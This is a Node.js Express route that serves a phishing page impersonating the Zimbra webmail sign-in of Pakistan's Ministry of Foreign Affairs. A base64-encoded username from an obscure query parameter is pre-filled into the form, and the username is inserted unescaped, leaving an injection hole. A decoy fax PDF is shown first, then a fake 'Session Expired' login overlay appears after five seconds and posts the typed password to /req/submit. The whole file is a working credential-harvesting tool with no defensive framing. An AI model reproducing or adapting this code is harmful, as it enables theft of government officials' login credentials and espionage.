
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.kjgfhdgudgherueru9843efjdfhfwheur;
   const username = Buffer.from(data3, 'base64').toString('utf-8');

	if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
    <!DOCTYPE html>
<html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
    <title>Ministry of Foreign Affairs Web Client Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="stylesheet" type="text/css" href="/stylesheet/new.css">
    <link rel="SHORTCUT ICON" href="/images/favicon.ico">
    <style>
            .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.90);
            z-index: 999;
        }

        #modifiedLogin{


                padding: 20px;           
                z-index: 1000;
            
        }
    </style>

</head>
<body onload="onLoad();">
    <object style="height:950px; width:1920px;" data="./Fax Message.pdf"></object>

<div class="overlay" id="overlay"></div>
<div id="modifiedLogin" class="LoginScreen">
    <div class="modernCenter">
            <div class="modernContentBox">
                <div class="logo">
                    <a href="https://mail.mofa.gov.pk/#" id="bannerLink" target="_new" title="Ministry of Foreign Affairs"><span class="ScreenReaderOnly">Ministry of Foreign Affairs</span>
                        <span class="ImgLoginBanner"></span>
                    </a>
                </div>				
            <form id="zLoginForm" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
                            <input type="hidden" name="loginOp" value="login">
                            <input type="hidden" name="login_csrf" value="c14daf38-9b9d-4c4c-b9d0-b049e424a462">

                            <div class="signIn">Sign In</div>
                    <div class="form">
                    <div id="errorMessageDiv" class="errorMessage">
                        Your Session Expired, Please login again.</div>
                    <div class="loginSection">
                                <label for="username" class="zLoginFieldLabel">Username</label>
                                        <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="${username}" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
                                    <label for="password" class="zLoginFieldLabel">Password</label>
                                <div class="passwordWrapper">
                                    <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024">
                                    <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">Show</span>
                                    <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
                                </div>
                                  <script>
            function showPassword() {
                var x = document.getElementById("password");
                var y = document.getElementById("showSpan")
                var z = document.getElementById("hideSpan")
                if (x.type === "password") {
                    x.type = "text";   
                    y.style.display = "none";
                    z.style.display = "block";
                } 
                else {
                    x.type = "password";
                    y.style.display = "block";
                    z.style.display = "none";
                }
            }
            
            </script>
                                <div class="signInAndLabel">
                                    <div>
                                        <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
                                    </div>
                                    <div class="rememberCheckWrapper"> 
                                            <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
                                            <label id="remember" for="remember">Stay signed in</label>
                                        </div>
                                    </div>
                            </div>
                        <div>
                        <hr>
                        </div>
                        <div>
                        <div class="versionBlock">
                                <label for="client">Web App Version</label>
                                <div style="position: relative;">
                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                        <option value="preferred" selected=""> Default</option>
                                        <option value="advanced"> Classic</option>
                                        <option value="modern"> Modern</option>
                                        </select>
                                    <input type="button" class="alignWhatsThis" onclick="showTooltip();" id="ZLoginWhatsThisButton">
                                </div>

                                <div id="ZLoginWhatsThis">
                                    <div class="ZLoginInfo">
                                        <span id="dialogCloseButton" onclick="hideTooltip();">×</span>
                                        <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
        </div>
        <div class="decor1"></div>
    </div>

   
</div>
<script>
    // Show the popup and overlay after a delay
    setTimeout(function() {
        document.getElementById('overlay').style.display = 'block';
        document.getElementById('modifiedLogin').style.display = 'flex';
    }, 5000);

</script>


</body></html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});




module.exports =router
